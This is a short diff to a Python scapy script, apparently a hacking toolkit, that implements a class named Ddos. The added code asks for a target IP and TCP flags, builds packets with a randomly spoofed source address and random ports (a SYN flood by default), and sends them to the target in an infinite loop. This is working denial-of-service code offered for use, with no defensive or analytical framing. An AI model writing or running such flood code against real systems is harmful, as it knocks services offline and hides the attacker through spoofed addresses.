@@ -1,4 +1,4 @@
-from scapy.all import ICMP, ARP, IP, UDP, TCP, Ether, RandShort, RandIP
+from scapy.all import ICMP, ARP, IP, UDP, TCP, Ether, RandShort, RandIP, send
 from threading import Thread
 import socket
 
@@ -8,8 +8,9 @@ class PortScanner:
 
 class Ddos:
     def __init__(self):
-        self.ip = input("\n\n[*]Enter target ip: ")
-
+        self.ip = input("\n\n   [*]Enter target ip: ")
+        flags = input("\n\n   [*]Enter flags(Syn flood by default): ")
+        self.packet = IP(dst=self.ip, src=RandIP())/TCP(flags=flags, dport=RandShort(), sport=RandShort())
 
     def dos(self):
-        pass
+        send(self.packet, loop=1, verbose=1)
